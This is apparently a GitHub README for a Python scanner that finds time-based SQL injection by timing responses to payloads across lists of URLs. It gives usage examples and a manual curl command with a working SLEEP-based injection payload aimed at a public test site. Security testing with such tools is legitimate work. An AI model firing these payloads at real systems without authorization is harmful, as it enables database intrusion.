# SQLi_Sleeps
It is a simple script that allows to find SQLi vulnerabilities, obtaining the response time greater than 20 seconds per medium and time-based injection.


```sh
usage: SQLi_Sleeps2.py [-h] -u URLS -d DATA [-c COOKIE]

Realiza una petición GET a múltiples URLs con diferentes datos.

options:
  -h, --help            show this help message and exit
  -u URLS, --urls URLS  Archivo de texto con las URLs a las que se les realizará la petición GET.
  -d DATA, --data DATA  Archivo de texto con los datos que se agregarán a las URLs.
  -c COOKIE, --cookie COOKIE
                        Cookie a incluir en la petición GET.

# Cookie simple
python3 script.py -u urls.txt -d data.txt -c "session=abc123"

# Múltiples cookies
python3 script.py -u urls.txt -d data.txt -c "session=abc123; user_id=456"

# Sin cookie
python3 script.py -u urls.txt -d data.txt

```

```sh
cat urls.txt | sed 's/FUZZ//g'
```
![image](https://user-images.githubusercontent.com/66162160/234191152-7f27d67b-2a32-476d-8668-0334b1ff08ae.png) <br>

## PoC

```sh
python3 SQLi_Sleeps2.py -u urls.txt -d data.txt
```

<img width="1206" height="543" alt="image" src="https://github.com/user-attachments/assets/a1833e75-be16-43f2-9de5-5ff9401dd427" /><br>

Manual analysis

```sh
time curl "http://testphp.vulnweb.com/search.php?test=query'XOR(SELECT(0)FROM(SELECT(SLEEP(5)))a)XOR'Z" -I
```

<img width="890" height="241" alt="image" src="https://github.com/user-attachments/assets/ec7a995a-9965-481d-8361-a7e84cb8e282" /><br>
